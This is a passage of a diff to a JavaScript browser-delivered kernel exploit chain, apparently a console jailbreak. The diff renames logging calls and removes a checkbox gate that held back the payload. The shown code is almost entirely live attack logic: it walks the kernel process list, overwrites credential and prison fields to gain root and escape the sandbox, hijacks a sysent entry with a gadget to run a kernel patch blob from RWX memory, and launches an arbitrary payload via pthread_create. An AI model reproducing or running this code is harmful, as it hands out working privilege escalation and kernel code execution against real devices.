                                     ? kview(optsC).getBInt(PKTOPTS_RTHDR, true) : null;
 
-                                __exploitBridge.mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
+                                mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
                                     + " in6p_outputopts=" + (optsA || "null")
                                     + "   want " + reqs1Aligned);
-                                __exploitBridge.mark("REPAIR-WALK", "fd " + pktoptsTwins[1]
+                                mark("REPAIR-WALK", "fd " + pktoptsTwins[1]
                                     + " ip6po_rthdr=" + (rthdrB || "null")
                                     + "   want " + reqs1Aligned);
-                                __exploitBridge.mark("REPAIR-WALK", "fd " + fdC
+                                mark("REPAIR-WALK", "fd " + fdC
                                     + " ip6po_rthdr=" + (rthdrC || "null")
                                     + "   want " + reqs2Addr);
-                                __exploitBridge.mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
+                                mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
                                     + " ip6po_pktinfo=" + (pktinfoA || "null")
                                     + "   want " + pipeM.add32(8)
                                     + " (master's pipebuf.out)");
@@ -2857,7 +2774,7 @@ try {
                                     if (lo || hi) dirtyWords.push("+0x" + o.toString(16)
                                         + "=" + new int64(lo, hi));
                                 }
-                                __exploitBridge.mark("REPAIR-AUDIT", auditN + " bytes of the aliased "
+                                mark("REPAIR-AUDIT", auditN + " bytes of the aliased "
                                     + "pktopts read back; head "
                                     + hexBytes(chunkX.u8.subarray(0, 16))
                                     + "   tclass=" + hx(chunkX.dv.getUint32(PKTOPTS_TCLASS, true))
@@ -2874,7 +2791,7 @@ try {
                                 const canRepair = walkA && walkB && walkC && walkP
                                     && auditOk;
                                 if (!canRepair) {
-                                    __exploitBridge.mark("REPAIR-REFUSED", "the repair was NOT "
+                                    mark("REPAIR-REFUSED", "the repair was NOT "
                                         + "attempted. Nothing was written and nothing "
                                         + "will be closed -- an unverified repair is "
                                         + "worse than none, because it turns a known "
@@ -2909,7 +2826,7 @@ try {
 
                                         if (h.after > h.before && h.after >= 2) held++;
                                     }
-                                    __exploitBridge.mark("PIPE-REFCNT", holdLog.join("  "));
+                                    mark("PIPE-REFCNT", holdLog.join("  "));
                                     check("four-pipe-files-hold"
                                         + "reference", held === 4,
                                         held + "/4 -- without this, closing the master "
@@ -2943,7 +2860,7 @@ try {
                                     const zeroed = function (v) {
                                         return !!v && v.low === 0 && v.hi === 0;
                                     };
-                                    __exploitBridge.mark("REPAIR-WRITE", "ip6po_pktinfo=" + backA
+                                    mark("REPAIR-WRITE", "ip6po_pktinfo=" + backA
                                         + " ip6po_m=" + backM
                                         + " twin rthdr=" + backB
                                         + " 0x80 rthdr=" + backC);
@@ -2971,7 +2888,7 @@ try {
                                         + hexBytes(chunkX.u8.subarray(0, 16)));
 
                                     repaired = held === 4 && cleared && leftover === 0;
-                                    __exploitBridge.mark(repaired ? "REPAIR-DONE" : "REPAIR-PARTIAL",
+                                    mark(repaired ? "REPAIR-DONE" : "REPAIR-PARTIAL",
                                         repaired
                                             ? "every doubly-owned allocation now has "
                                               + "exactly one owner. cleanup() is "
@@ -2995,13 +2912,13 @@ try {
                                 }
 
                                 if (!repaired) {
-                                    __exploitBridge.mark("JAILBREAK-SKIPPED", "the repair did not "
+                                    mark("JAILBREAK-SKIPPED", "the repair did not "
                                         + "verify, so this run is already going to "
                                         + "ask for a reboot. Doing more kernel "
                                         + "writes on top of that is how a clean "
                                         + "failure becomes a panic.");
                                 } else try {
-                                    __exploitBridge.state("stage 8: jailbreak...");
+                                    state("stage 8: jailbreak...", "warn");
 
                                     const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
                                     const P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
@@ -3022,7 +2939,7 @@ try {
                                         walk = kview(walk).getBInt(P_LIST_PREV, true);
                                         steps++;
                                     }
-                                    __exploitBridge.mark("ALLPROC", (allproc || "NOT FOUND")
+                                    mark("ALLPROC", (allproc || "NOT FOUND")
                                         + "   after " + steps + " le_prev step(s) "
                                         + "back from " + curproc
                                         + (allproc && kbase ? "   = kernel_base + 0x"
@@ -3051,7 +2968,7 @@ try {
                                     }
                                     const selfProc = pfind(myPid);
                                     const kProc = pfind(KERNEL_PID);
-                                    __exploitBridge.mark("PFIND", "pid " + myPid + " -> "
+                                    mark("PFIND", "pid " + myPid + " -> "
                                         + (selfProc || "null") + "   pid 0 -> "
                                         + (kProc || "null")
                                         + "   first pids on the list: " + procs.slice(0, 8));
@@ -3069,7 +2986,7 @@ try {
                                         const uidBefore = sc(SYS.getuid).i32;
                                         const setuidBefore = sc(SYS.setuid, 0).i32;
                                         const uidAfterTry = sc(SYS.getuid).i32;
-                                        __exploitBridge.mark("PRE-JAILBREAK", "getuid=" + uidBefore
+                                        mark("PRE-JAILBREAK", "getuid=" + uidBefore
                                             + "  setuid(0)=" + setuidBefore
                                             + "  getuid=" + uidAfterTry);
                                         check("process-unprivileged-before"
@@ -3093,7 +3010,7 @@ try {
                                         const before = PROBE_PATHS.map(function (s) {
                                             return s + "=" + tryOpen(s);
                                         });
-                                        __exploitBridge.mark("SANDBOX-BEFORE", before.join("  "));
+                                        mark("SANDBOX-BEFORE", before.join("  "));
 
                                         const pUcred = kview(selfProc).getBInt(P_UCRED, true);
                                         const kUcred = kview(kProc).getBInt(P_UCRED, true);
@@ -3101,7 +3018,7 @@ try {
                                         const pFdb = kview(selfProc).getBInt(P_FD, true);
                                         const kFdb = kview(kProc).getBInt(P_FD, true);
                                         const rootVnode = kview(kFdb).getBInt(FD_RDIR, true);
-                                        __exploitBridge.mark("JAILBREAK-SOURCES", "p_ucred=" + pUcred
+                                        mark("JAILBREAK-SOURCES", "p_ucred=" + pUcred
                                             + " kp_ucred=" + kUcred + " prison0=" + prison0
                                             + " p_fd=" + pFdb + " root_vnode=" + rootVnode);
                                         const srcOk = kptr(pUcred) && kptr(kUcred)
@@ -3134,7 +3051,7 @@ try {
                                                 attr: kview(pUcred).getUint8(CR_SCEATTR0),
                                                 rdir: kview(pFdb).getBInt(FD_RDIR, true)
                                             };
-                                            __exploitBridge.mark("JAILBREAK-WRITE", "cr_uid=" + back.uid
+                                            mark("JAILBREAK-WRITE", "cr_uid=" + back.uid
                                                 + " cr_prison=" + back.prison
                                                 + " cr_sceAuthId=" + back.auth
                                                 + " cr_sceCaps[0]=" + back.caps
@@ -3150,7 +3067,7 @@ try {
                                             const uidNow = sc(SYS.getuid).i32;
                                             const euidNow = sc(SYS.geteuid).i32;
                                             const setuidNow = sc(SYS.setuid, 0).i32;
-                                            __exploitBridge.mark("POST-JAILBREAK", "getuid=" + uidNow
+                                            mark("POST-JAILBREAK", "getuid=" + uidNow
                                                 + " geteuid=" + euidNow
                                                 + " setuid(0)=" + setuidNow);
                                             const rooted = uidNow === 0 && setuidNow === 0;
@@ -3164,7 +3081,7 @@ try {
                                             const after = PROBE_PATHS.map(function (s) {
                                                 return s + "=" + tryOpen(s);
                                             });
-                                            __exploitBridge.mark("SANDBOX-AFTER", after.join("  "));
+                                            mark("SANDBOX-AFTER", after.join("  "));
                                             const escaped = PROBE_PATHS.some(function (s, i) {
                                                 return before[i].endsWith("=-1")
                                                     && !after[i].endsWith("=-1");
@@ -3181,7 +3098,7 @@ try {
                                         }
                                     }
                                 } catch (e) {
-                                    __exploitBridge.mark("JAILBREAK-THREW", (e && e.message)
+                                    mark("JAILBREAK-THREW", (e && e.message)
                                         ? e.message : String(e));
                                 }
 
@@ -3190,7 +3107,7 @@ try {
                                     ? KOFF.k_sysent_661 : 0x1109350;
                                 const JMP_RSI_GADGET = KOFF.k_jmp_rsi !== undefined
                                     ? KOFF.k_jmp_rsi : 0x71a21;
-                                __exploitBridge.mark("KOFF", "sysent[661]=0x" + SYSENT_661.toString(16)
+                                mark("KOFF", "sysent[661]=0x" + SYSENT_661.toString(16)
                                     + " jmp[rsi]=0x" + JMP_RSI_GADGET.toString(16)
                                     + "   source=" + (KOFF.k_sysent_661 !== undefined
                                         ? "offsets table" : "built-in 11.00 fallback"));
@@ -3201,12 +3118,12 @@ try {
                                 const KEXEC_MAP = new int64(0x20100000, 9);
 
                                 if (!(jailbroken && kbase && kpatch)) {
-                                    __exploitBridge.mark("KPATCH-SKIPPED", "need root, a kernel base "
+                                    mark("KPATCH-SKIPPED", "need root, a kernel base "
                                         + "and the blob; have root=" + jailbroken
                                         + " kbase=" + (kbase || "null")
                                         + " blob=" + (kpatch ? kpatch.length : 0));
                                 } else try {
-                                    __exploitBridge.state("stage 9: kernel patches...");
+                                    state("stage 9: kernel patches...", "warn");
                                     const sysent = kbase.add32(SYSENT_661);
                                     const gadget = kbase.add32(JMP_RSI_GADGET);
 
@@ -3216,7 +3133,7 @@ try {
                                     const gadgetOk = gbuf.u8[0] === 0xff && gbuf.u8[1] === 0x26;
                                     const wouldExecArgs = gbuf.u8[0] === 0xff
                                         && gbuf.u8[1] === 0xe6;
-                                    __exploitBridge.mark("KPATCH-GADGET", gadget + " reads "
+                                    mark("KPATCH-GADGET", gadget + " reads "
                                         + hexBytes(gbuf.u8.subarray(0, 8))
                                         + "   want ff 26 (jmp qword [rsi])");
                                     check("sysent-replacement-sy_call"
@@ -3234,7 +3151,7 @@ try {
                                     const syNarg = kview(sysent).getUint32(0, true);
                                     const syCall = kview(sysent).getBInt(8, true);
                                     const syThrcnt = kview(sysent).getUint32(0x2c, true);
-                                    __exploitBridge.mark("KPATCH-SYSENT", sysent + "  sy_narg=" + syNarg
+                                    mark("KPATCH-SYSENT", sysent + "  sy_narg=" + syNarg
                                         + " sy_call=" + syCall + " sy_thrcnt=" + syThrcnt);
                                     const sysentOk = syNarg <= 8 && inImageAddr(syCall)
                                         && syThrcnt <= 8;
@@ -3258,7 +3175,7 @@ try {
                                         if (!good) siteBad.push("0x" + off2.toString(16)
                                             + "=" + hexByte(b));
                                     }
-                                    __exploitBridge.mark("KPATCH-SITES", siteLog.join(" ")
+                                    mark("KPATCH-SITES", siteLog.join(" ")
                                         + "   (* = already 0xeb)");
 
                                     const sitesOk = siteBad.length === 0
@@ -3271,7 +3188,7 @@ try {
                                             : "REFUSING -- " + siteBad.join(" "));
 
                                     if (!(gadgetOk && sysentOk && sitesOk)) {
-                                        __exploitBridge.mark("KPATCH-REFUSED", "one of the three gates "
+                                        mark("KPATCH-REFUSED", "one of the three gates "
                                             + "failed. sysent was not touched, no memory "
                                             + "was mapped and nothing was executed.");
                                     } else {
@@ -3283,7 +3200,7 @@ try {
                                         const mm = scAny(SYS_MMAP, KEXEC_MAP, size, prot,
                                             MAP_SHARED | MAP_FIXED, execFd, 0);
                                         const mapped = new int64(mm.lo, mm.hi);
-                                        __exploitBridge.mark("KPATCH-MAP", "jitshm_create(0, 0x"
+                                        mark("KPATCH-MAP", "jitshm_create(0, 0x"
                                             + size.toString(16) + ", rwx) = " + execFd
                                             + "   mmap(" + KEXEC_MAP + ") = " + mapped);
                                         const mapOk = execFd >= 0 && mm.i32 !== -1
@@ -3318,14 +3235,14 @@ try {
                                                 }
                                             }
                                             const headBack = p.read8(mapped);
-                                            __exploitBridge.mark("KPATCH-COPY", kpatch.length
+                                            mark("KPATCH-COPY", kpatch.length
                                                 + " bytes written to " + mapped
                                                 + ", first qword reads " + headBack);
                                             check("blob-rwx-memory-byte"
                                                 + "byte", copied, "");
 
                                             if (copied && params.get("patch") === "0") {
-                                                __exploitBridge.mark("KEXEC-WITHHELD", "?patch=0 -- "
+                                                mark("KEXEC-WITHHELD", "?patch=0 -- "
                                                     + "sysent was NOT modified and the "
                                                     + "blob was NOT executed. Everything "
                                                     + "up to that point is proven above.");
@@ -3336,7 +3253,7 @@ try {
                                                 kview(sysent).setUint32(0x2c, 1, true);
                                                 const armed = sameI64(
                                                     kview(sysent).getBInt(8, true), gadget);
-                                                __exploitBridge.mark("SYSENT-ARMED", "sy_call -> " + gadget
+                                                mark("SYSENT-ARMED", "sy_call -> " + gadget
                                                     + (armed ? "  confirmed" : "  MISMATCH"));
 
                                                 let kexecRet = -2;
@@ -3353,7 +3270,7 @@ try {
                                                         === syNarg
                                                     && kview(sysent).getUint32(0x2c, true)
                                                         === syThrcnt;
-                                                __exploitBridge.mark("KEXEC", "syscall(661, " + mapped
+                                                mark("KEXEC", "syscall(661, " + mapped
                                                     + ") = " + kexecRet
                                                     + "   sysent restored=" + restored);
                                                 check("sysent661-put"
@@ -3376,7 +3293,7 @@ try {
                                                     if (b !== 0xeb) stillCond.push(
                                                         "0x" + off2.toString(16));
                                                 }
-                                                __exploitBridge.mark("KPATCH-VERIFY", after2.join(" "));
+                                                mark("KPATCH-VERIFY", after2.join(" "));
                                                 const patchedOk = stillCond.length === 0;
                                                 check("gated-site-reads-0xeb"
                                                     + "read back out of live kernel "
@@ -3390,12 +3307,12 @@ try {
                                                 kpatched = kexecRet === 0 && patchedOk
                                                     && restored;
                                                 if (kpatched) {
-                                                    __exploitBridge.mark("KERNEL-PATCHED",
+                                                    mark("KERNEL-PATCHED",
                                                         (kpatchName || "the blob")
                                                         + " applied and verified "
                                                         + "(main.js:106-116).");
                                                     if (PATCH_SETTLE > 0) {
-                                                        __exploitBridge.mark("PATCH-SETTLE",
+                                                        mark("PATCH-SETTLE",
                                                             "ms=" + PATCH_SETTLE);
                                                         settle(PATCH_SETTLE);
                                                     }
@@ -3404,238 +3321,224 @@ try {
                                         }
                                     }
                                 } catch (e) {
-                                    __exploitBridge.mark("KPATCH-THREW", (e && e.message)
+                                    mark("KPATCH-THREW", (e && e.message)
                                         ? e.message : String(e));
                                 }
 
                                 const MAP_PRIVATE = 2, MAP_ANONYMOUS = 0x1000;
                                 if (!kpatched) {
-                                    __exploitBridge.mark("PAYLOAD-SKIPPED", "reason=kpatch-incomplete");
+                                    mark("PAYLOAD-SKIPPED", "reason=kpatch-incomplete");
                                 }
                                 if (!payload) {
-                                    __exploitBridge.mark("PAYLOAD-NONE", "payload.bin was not loaded");
+                                    mark("PAYLOAD-NONE", "payload.bin was not loaded");
                                 }
 
-                                // ============================================
-                                // NUEVO: Verificar Auto antes de ejecutar payload
-                                // ============================================
-                                if (payload && params.get("payload") === "0") {
-                                    __exploitBridge.mark("PAYLOAD-SKIPPED", "reason=payload=0");
-                                } else if (payload && (kpatched || params.get("payload") === "1")) {
-                                    // Verificar estado del Auto
-                                    var autoCheckbox2 = document.getElementById("checkbox1");
-                                    var autoOn2 = autoCheckbox2 ? autoCheckbox2.checked : false;
-                                    var hayPayloadManual2 = (typeof window.payloadManualSeleccionado !== 'undefined' && window.payloadManualSeleccionado !== null);
+                                if (payload && params.get("payload") === "0")
+                                    mark("PAYLOAD-SKIPPED", "reason=payload=0");
+                                else if (payload && (kpatched || params.get("payload") === "1"))
+                                    try {
+                                    state("stage 10: loading the payload...", "warn");
 
-                                    if (!autoOn2 && !hayPayloadManual2 && params.get("payload") !== "1") {
-                                        __exploitBridge.mark("AUTO-OFF", "payload.bin It does NOT run because Auto is OFF.");
-                                        // Mostrar mensaje en pantalla
-                                        __exploitBridge.state("JAILBREAK COMPLETE — Auto-OFF: select a payload manually");
-                                    } else {
-                                        try {
-                                            __exploitBridge.state("stage 10: loading the payload...");
+                                    const psize = (payload.length + 0x3fff) & ~0x3fff;
+                                    const pr = PROT_READ | PROT_WRITE | PROT_EXEC;
+                                    const em = scAny(SYS9.mmap, 0, psize, pr,
+                                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+                                    const entry = new int64(em.lo, em.hi);
+                                    mark("PAYLOAD-MAP", "mmap(0, 0x" + psize.toString(16)
+                                        + ", rwx, PRIVATE|ANON) = " + entry);
+                                    const entryOk = em.i32 !== -1
+                                        && !(entry.low === 0 && entry.hi === 0);
+                                    check("the payload has " + payload.length
+                                        + " bytes of anonymous RWX to live in",
+                                        entryOk, entryOk ? "" : "mmap refused");
 
-                                            const psize = (payload.length + 0x3fff) & ~0x3fff;
-                                            const pr = PROT_READ | PROT_WRITE | PROT_EXEC;
-                                            const em = scAny(SYS9.mmap, 0, psize, pr,
-                                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-                                            const entry = new int64(em.lo, em.hi);
-                                            __exploitBridge.mark("PAYLOAD-MAP", "mmap(0, 0x" + psize.toString(16)
-                                                + ", rwx, PRIVATE|ANON) = " + entry);
-                                            const entryOk = em.i32 !== -1
-                                                && !(entry.low === 0 && entry.hi === 0);
-                                            check("the payload has " + payload.length
-                                                + " bytes of anonymous RWX to live in",
-                                                entryOk, entryOk ? "" : "mmap refused");
+                                    if (entryOk) {
 
-                                            if (entryOk) {
-
-                                                const tCopy = Date.now();
-                                                for (let o = 0; o < payload.length; o += 8) {
-                                                    let lo = 0, hi = 0;
-                                                    for (let k = 0; k < 4; ++k)
-                                                        lo |= (payload[o + k] || 0) << (8 * k);
-                                                    for (let k = 0; k < 4; ++k)
-                                                        hi |= (payload[o + 4 + k] || 0) << (8 * k);
-                                                    p.write8(entry.add32(o),
-                                                        new int64(lo >>> 0, hi >>> 0));
-                                                }
-                                                const copyMs = Date.now() - tCopy;
-                                                const tVer = Date.now();
-                                                let bad = -1;
-                                                for (let o = 0; o < payload.length && bad < 0;
-                                                     o += 8) {
-                                                    const w = p.read8(entry.add32(o));
-                                                    for (let k = 0; k < 8; ++k) {
-                                                        const want = payload[o + k];
-                                                        if (want === undefined) continue;
-                                                        const got = k < 4
-                                                            ? (w.low >>> (8 * k)) & 0xff
-                                                            : (w.hi >>> (8 * (k - 4))) & 0xff;
-                                                        if (got !== want) { bad = o + k; break; }
-                                                    }
-                                                }
-                                                const verMs = Date.now() - tVer;
-                                                __exploitBridge.mark("PAYLOAD-COPY", payload.length
-                                                    + " bytes to " + entry + " in " + copyMs
-                                                    + " ms, verified in " + verMs + " ms"
-                                                    + (bad < 0 ? "" : "  MISMATCH at +0x"
-                                                        + bad.toString(16)));
-                                                check("byte-payload-rwx"
-                                                    + "memory", bad < 0,
-                                                    bad < 0 ? "read back through the same "
-                                                        + "primitive that wrote it" : "");
-
-                                                const PTHREAD_CREATE_RVA = 0x2068;
-                                                const cand = webkitBase.add32(PTHREAD_CREATE_RVA);
-                                                const cb = [];
-                                                for (let i = 0; i < 16; ++i)
-                                                    cb.push(p.read1(cand.add32(i)));
-                                                __exploitBridge.mark("PTHREAD-BYTES", cand + " (webkit+0x"
-                                                    + PTHREAD_CREATE_RVA.toString(16) + ") reads "
-                                                    + hexBytes(cb));
-
-                                                const alt = libkernelBase.add32(PTHREAD_CREATE_RVA);
-                                                const ab = [];
-                                                for (let i = 0; i < 16; ++i)
-                                                    ab.push(p.read1(alt.add32(i)));
-                                                __exploitBridge.mark("PTHREAD-BYTES-ALT", alt + " (libkernel+0x"
-                                                    + PTHREAD_CREATE_RVA.toString(16) + ") reads "
-                                                    + hexBytes(ab));
-
-                                                let target = null, how = "";
-                                                if (cb[0] === 0xff && cb[1] === 0x25) {
-
-                                                    const rel = (cb[2] | (cb[3] << 8)
-                                                        | (cb[4] << 16) | (cb[5] << 24)) | 0;
-                                                    const got = rel >= 0 ? cand.add32(6 + rel)
-                                                        : cand.add32(6).sub32(-rel);
-                                                    const fn2 = p.read8(got);
-                                                    const nearK = fn2.hi === libkernelBase.hi;
-                                                    const nearW = fn2.hi === webkitBase.hi;
-                                                    __exploitBridge.mark("PTHREAD-THUNK", "jmp qword [rip"
-                                                        + (rel < 0 ? "" : "+") + rel + "]  GOT "
-                                                        + got + " -> " + fn2
-                                                        + (nearK ? "  (libkernel+0x"
-                                                            + ((fn2.low - libkernelBase.low) >>> 0)
-                                                                .toString(16) + ")"
-                                                         : nearW ? "  (webkit+0x"
-                                                            + ((fn2.low - webkitBase.low) >>> 0)
-                                                                .toString(16) + ")" : ""));
-                                                    if (fn2.hi > 0 && (fn2.low & 7) === 0
-                                                        || nearK || nearW) {
-                                                        target = cand; how = "import thunk";
-                                                    }
-                                                } else if (cb[0] === 0xf3 && cb[1] === 0x0f
-                                                    && cb[2] === 0x1e && cb[3] === 0xfa) {
-                                                    target = cand; how = "endbr64 prologue";
-                                                } else if (cb[0] === 0x55
-                                                    || (cb[0] === 0x48 && cb[1] === 0x83)
-                                                    || (cb[0] === 0x41 && cb[1] === 0x57)) {
-                                                    target = cand; how = "function prologue";
-                                                }
-
-                                                if (off.wk___imp_pthread_create !== undefined
-                                                    && off.k_pthread_create !== undefined) {
-                                                    const slot = webkitBase.add32(
-                                                        off.wk___imp_pthread_create);
-                                                    const fnT = p.read8(slot);
-                                                    const expect = libkernelBase.add32(
-                                                        off.k_pthread_create);
-                                                    const agree = sameI64(fnT, expect);
-                                                    __exploitBridge.mark("PTHREAD-TABLE", "GOT slot " + slot
-                                                        + " -> " + fnT + "   libkernel+0x"
-                                                        + off.k_pthread_create.toString(16)
-                                                        + " = " + expect
-                                                        + (agree ? "   AGREE" : "   DISAGREE"
-                                                            + " -- not using it"));
-                                                    if (agree) {
-                                                        target = expect;
-                                                        how = "offsets table, GOT slot "
-                                                            + "cross-checked against "
-                                                            + "libkernel's own RVA";
-                                                    }
-                                                }
-
-                                                const forced = params.get("forcepthread") === "1";
-                                                check("pthread_create was identified",
-                                                    !!target,
-                                                    target ? how + " -- calling it"
-                                                        : "neither a thunk nor a prologue. The "
-                                                        + "payload stays mapped at " + entry
-                                                        + " and is NOT launched. Read "
-                                                        + "PTHREAD-BYTES above and fix the "
-                                                        + "offset, or ?forcepthread=1.");
-
-                                                if (!target && forced) {
-                                                    target = cand; how = "forced";
-                                                    __exploitBridge.mark("PTHREAD-FORCED", "?forcepthread=1 -- "
-                                                        + "calling " + cand + " anyway");
-                                                }
-
-                                                if (target && bad < 0) {
-                                                    const thr = alloc(8);
-                                                    thr.u8.fill(0);
-                                                    const rc = callAddr(target, thr.addr, 0,
-                                                        entry, 0).i32;
-                                                    const handle = new int64(
-                                                        thr.dv.getUint32(0, true),
-                                                        thr.dv.getUint32(4, true));
-                                                    let tid = null;
-                                                    if (handle.hi > 0) tid = p.read8(handle);
-                                                    __exploitBridge.mark("PTHREAD-CREATE", "pthread_create(&t, "
-                                                        + "0, " + entry + ", 0) = " + rc
-                                                        + "   handle=" + handle
-                                                        + "   id=" + (tid || "?"));
-                                                    const launched = rc === 0 && handle.hi > 0;
-                                                    check("payload-thread-created",
-                                                        launched, launched
-                                                            ? "pthread_create returned 0 and "
-                                                            + "wrote back a thread handle"
-                                                            : "returned " + rc);
-                                                    payloadRunning = launched;
-                                                    if (launched)
-                                                        __exploitBridge.mark("PAYLOAD-RUNNING", "bytes="
-                                                            + payload.length + " entry="
-                                                            + entry);
-
-                                                        if (PAYLOAD_SETTLE > 0) {
-                                                            __exploitBridge.mark("PAYLOAD-SETTLE",
-                                                                "ms=" + PAYLOAD_SETTLE);
-                                                            settle(PAYLOAD_SETTLE);
-                                                            __exploitBridge.mark("PAYLOAD-ALIVE",
-                                                                "getpid=" + scAny(SYS.getpid).i32
-                                                                + " after=" + PAYLOAD_SETTLE + "ms");
-                                                        }
-                                                } else if (!target) {
-                                                    __exploitBridge.mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
-                                                        "the payload is at " + entry
-                                                        + " with RWX and verified byte for "
-                                                        + "byte. Only the launch is missing.");
-                                                }
+                                        const tCopy = Date.now();
+                                        for (let o = 0; o < payload.length; o += 8) {
+                                            let lo = 0, hi = 0;
+                                            for (let k = 0; k < 4; ++k)
+                                                lo |= (payload[o + k] || 0) << (8 * k);
+                                            for (let k = 0; k < 4; ++k)
+                                                hi |= (payload[o + 4 + k] || 0) << (8 * k);
+                                            p.write8(entry.add32(o),
+                                                new int64(lo >>> 0, hi >>> 0));
+                                        }
+                                        const copyMs = Date.now() - tCopy;
+                                        const tVer = Date.now();
+                                        let bad = -1;
+                                        for (let o = 0; o < payload.length && bad < 0;
+                                             o += 8) {
+                                            const w = p.read8(entry.add32(o));
+                                            for (let k = 0; k < 8; ++k) {
+                                                const want = payload[o + k];
+                                                if (want === undefined) continue;
+                                                const got = k < 4
+                                                    ? (w.low >>> (8 * k)) & 0xff
+                                                    : (w.hi >>> (8 * (k - 4))) & 0xff;
+                                                if (got !== want) { bad = o + k; break; }
                                             }
-                                        } catch (e) {
-                                            __exploitBridge.mark("PAYLOAD-THREW", (e && e.message) ? e.message : String(e));
+                                        }
+                                        const verMs = Date.now() - tVer;
+                                        mark("PAYLOAD-COPY", payload.length
+                                            + " bytes to " + entry + " in " + copyMs
+                                            + " ms, verified in " + verMs + " ms"
+                                            + (bad < 0 ? "" : "  MISMATCH at +0x"
+                                                + bad.toString(16)));
+                                        check("byte-payload-rwx"
+                                            + "memory", bad < 0,
+                                            bad < 0 ? "read back through the same "
+                                                + "primitive that wrote it" : "");
+
+                                        const PTHREAD_CREATE_RVA = 0x2068;
+                                        const cand = webkitBase.add32(PTHREAD_CREATE_RVA);
+                                        const cb = [];
+                                        for (let i = 0; i < 16; ++i)
+                                            cb.push(p.read1(cand.add32(i)));
+                                        mark("PTHREAD-BYTES", cand + " (webkit+0x"
+                                            + PTHREAD_CREATE_RVA.toString(16) + ") reads "
+                                            + hexBytes(cb));
+
+                                        const alt = libkernelBase.add32(PTHREAD_CREATE_RVA);
+                                        const ab = [];
+                                        for (let i = 0; i < 16; ++i)
+                                            ab.push(p.read1(alt.add32(i)));
+                                        mark("PTHREAD-BYTES-ALT", alt + " (libkernel+0x"
+                                            + PTHREAD_CREATE_RVA.toString(16) + ") reads "
+                                            + hexBytes(ab));
+
+                                        let target = null, how = "";
+                                        if (cb[0] === 0xff && cb[1] === 0x25) {
+
+                                            const rel = (cb[2] | (cb[3] << 8)
+                                                | (cb[4] << 16) | (cb[5] << 24)) | 0;
+                                            const got = rel >= 0 ? cand.add32(6 + rel)
+                                                : cand.add32(6).sub32(-rel);
+                                            const fn2 = p.read8(got);
+                                            const nearK = fn2.hi === libkernelBase.hi;
+                                            const nearW = fn2.hi === webkitBase.hi;
+                                            mark("PTHREAD-THUNK", "jmp qword [rip"
+                                                + (rel < 0 ? "" : "+") + rel + "]  GOT "
+                                                + got + " -> " + fn2
+                                                + (nearK ? "  (libkernel+0x"
+                                                    + ((fn2.low - libkernelBase.low) >>> 0)
+                                                        .toString(16) + ")"
+                                                 : nearW ? "  (webkit+0x"
+                                                    + ((fn2.low - webkitBase.low) >>> 0)
+                                                        .toString(16) + ")" : ""));
+                                            if (fn2.hi > 0 && (fn2.low & 7) === 0
+                                                || nearK || nearW) {
+                                                target = cand; how = "import thunk";
+                                            }
+                                        } else if (cb[0] === 0xf3 && cb[1] === 0x0f
+                                            && cb[2] === 0x1e && cb[3] === 0xfa) {
+                                            target = cand; how = "endbr64 prologue";
+                                        } else if (cb[0] === 0x55
+                                            || (cb[0] === 0x48 && cb[1] === 0x83)
+                                            || (cb[0] === 0x41 && cb[1] === 0x57)) {
+                                            target = cand; how = "function prologue";
+                                        }
+
+                                        if (off.wk___imp_pthread_create !== undefined
+                                            && off.k_pthread_create !== undefined) {
+                                            const slot = webkitBase.add32(
+                                                off.wk___imp_pthread_create);
+                                            const fnT = p.read8(slot);
+                                            const expect = libkernelBase.add32(
+                                                off.k_pthread_create);
+                                            const agree = sameI64(fnT, expect);
+                                            mark("PTHREAD-TABLE", "GOT slot " + slot
+                                                + " -> " + fnT + "   libkernel+0x"
+                                                + off.k_pthread_create.toString(16)
+                                                + " = " + expect
+                                                + (agree ? "   AGREE" : "   DISAGREE"
+                                                    + " -- not using it"));
+                                            if (agree) {
+                                                target = expect;
+                                                how = "offsets table, GOT slot "
+                                                    + "cross-checked against "
+                                                    + "libkernel's own RVA";
+                                            }
+                                        }
+
+                                        const forced = params.get("forcepthread") === "1";
+                                        check("pthread_create was identified",
+                                            !!target,
+                                            target ? how + " -- calling it"
+                                                : "neither a thunk nor a prologue. The "
+                                                + "payload stays mapped at " + entry
+                                                + " and is NOT launched. Read "
+                                                + "PTHREAD-BYTES above and fix the "
+                                                + "offset, or ?forcepthread=1.");
+
+                                        if (!target && forced) {
+                                            target = cand; how = "forced";
+                                            mark("PTHREAD-FORCED", "?forcepthread=1 -- "
+                                                + "calling " + cand + " anyway");
+                                        }
+
+                                        if (target && bad < 0) {
+                                            const thr = alloc(8);
+                                            thr.u8.fill(0);
+                                            const rc = callAddr(target, thr.addr, 0,
+                                                entry, 0).i32;
+                                            const handle = new int64(
+                                                thr.dv.getUint32(0, true),
+                                                thr.dv.getUint32(4, true));
+                                            let tid = null;
+                                            if (handle.hi > 0) tid = p.read8(handle);
+                                            mark("PTHREAD-CREATE", "pthread_create(&t, "
+                                                + "0, " + entry + ", 0) = " + rc
+                                                + "   handle=" + handle
+                                                + "   id=" + (tid || "?"));
+                                            const launched = rc === 0 && handle.hi > 0;
+                                            check("payload-thread-created",
+                                                launched, launched
+                                                    ? "pthread_create returned 0 and "
+                                                    + "wrote back a thread handle"
+                                                    : "returned " + rc);
+                                            payloadRunning = launched;
+                                            if (launched)
+                                                mark("PAYLOAD-RUNNING", "bytes="
+                                                    + payload.length + " entry="
+                                                    + entry);
+
+                                                if (PAYLOAD_SETTLE > 0) {
+                                                    mark("PAYLOAD-SETTLE",
+                                                        "ms=" + PAYLOAD_SETTLE);
+                                                    settle(PAYLOAD_SETTLE);
+                                                    mark("PAYLOAD-ALIVE",
+                                                        "getpid=" + scAny(SYS.getpid).i32
+                                                        + " after=" + PAYLOAD_SETTLE + "ms");
+                                                }
+                                        } else if (!target) {
+                                            mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
+                                                "the payload is at " + entry
+                                                + " with RWX and verified byte for "
+                                                + "byte. Only the launch is missing.");
                                         }
                                     }
+                                } catch (e) {
+                                    mark("PAYLOAD-THREW", (e && e.message)
+                                        ? e.message : String(e));
                                 }
                                 }
                             }
                             }
                         } catch (e) {
